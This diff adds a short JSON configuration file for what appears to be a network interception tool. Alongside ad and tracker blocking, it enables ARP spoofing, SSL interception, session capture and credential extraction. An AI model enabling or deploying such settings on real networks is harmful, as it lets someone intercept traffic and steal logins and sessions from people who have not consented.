@@ -1,0 +1,30 @@
+{
+  "domain_blocking": true,
+  "blocked_domains": [
+    "ads.google.com",
+    "tracking.com",
+    "analytics.google.com",
+    "doubleclick.net",
+    "facebook.com/tr",
+    "googleadservices.com"
+  ],
+  "ssl_interception": true,
+  "session_capture": true,
+  "mobile_detection": true,
+  "log_level": "INFO",
+  "dns_poisoning": false,
+  "credential_capture": true,
+  "fake_ips": {
+    "ads.google.com": "192.168.1.1",
+    "tracking.com": "192.168.1.1",
+    "facebook.com": "192.168.1.1"
+  },
+  "features": {
+    "arp_spoofing": true,
+    "dns_sniffer": true,
+    "http_analysis": true,
+    "https_detection": true,
+    "credential_extraction": true,
+    "session_logging": true
+  }
+}
